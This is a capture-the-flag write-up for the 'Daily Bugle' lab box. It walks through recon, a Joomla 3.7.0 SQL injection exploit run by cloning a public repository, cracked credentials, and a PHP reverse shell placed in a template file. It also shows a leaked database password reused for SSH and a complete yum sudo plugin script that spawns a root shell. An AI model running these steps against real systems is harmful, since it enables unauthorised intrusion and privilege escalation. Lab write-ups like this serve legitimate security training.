# Daily Bugle 
Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

## Recon 
`nmap -sC -sV -T4 dailybugle.thm`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)

80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40

3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

`gobuster dir -u http://dailybugle.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,css,json,txt,xml`

## Version Disclosure 

`curl -v http://dailybugle.thm/administrator/manifests/files/joomla.xml` => 3.7
	`<version>3.7.0</version>`

## SQLi Injection via Python 

`git clone https://github.com/BaptisteContreras/CVE-2017-8917-Joomla.git`
`python3 -m main.py --host 10.82.180.131`

Revealed creds => jonah:spiderman123
	Cracked via hashes.com

## RCE via Template Editing  
Paste PHP reverse shell code into error.php file hosted on web server, start a listener, and execute the file located at `http://10.82.180.131/templates/beez3/error.php` for a reverse shell  

## Sensitive Information Disclosure 

`/var/www/html/configuration.php`

```
public $user = 'root';                                                                                                                                                  
public $password = 'nv5uz9r3ZEDzVjNu'
```

`ssh jjameson@10.82.180.131`
User flag obtained.

## Privilege Escalation 

`sudo -l`
	Jjameson has sudo privileges for /usr/bin/yum

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
```

`sudo yum -c $TF/x --enableplugin=y`

Root flag obtained. 